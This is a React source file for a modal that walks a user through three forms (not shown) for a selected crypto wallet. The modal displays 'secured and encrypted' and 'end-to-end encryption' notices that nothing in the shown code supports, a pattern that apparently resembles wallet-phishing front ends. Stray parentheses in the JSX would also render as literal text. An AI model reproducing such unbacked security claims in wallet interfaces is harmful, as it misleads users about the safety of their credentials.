/* eslint-disable react/prop-types */
import React, { useState } from "react";
import useMultistepForm from "../customHooks/useMultiStepForm";
import styles from "./Modal.module.css";
import FormOne from "./FormOne";
import FormTwo from "./FormTwo";
import FormThree from "./FormThree";
import { encryption } from "../assets";

const Modal = ({ selectedWallet, modalHandler }) => {
  const { steps, currentStep, next, step, stepNames, back } = useMultistepForm([
    <FormOne key={0} selectedWallet={selectedWallet} />,
    <FormTwo key={1} selectedWallet={selectedWallet} />,
    <FormThree
      key={2}
      selectedWallet={selectedWallet}
  
    />,
  ]);

  return (
    <div className={`${styles.overlay}`}>
      <div className={`${styles.overlay2}`} onClick={modalHandler}></div>(
      <div className={`${styles.formContainer}`}>
        <div>
          <div className={`${styles.formWrapper}`}>
            <img src={selectedWallet.image} className={`${styles.walletImg}`} />
            <h2 className="font-[700] text-[25px]">{selectedWallet.title}</h2>
            <p className="text-[12px]">This session is secured and encrypted</p>
            {step}

            <div className="flex gap-1  items-center">
              <img src={encryption} />
              <p className="font-bold text-[11px] text-center">
                This session is protected with an end-to-end encryption
              </p>
            </div>
          </div>
        </div>
      </div>
      )
    </div>
  );
};

export default Modal;
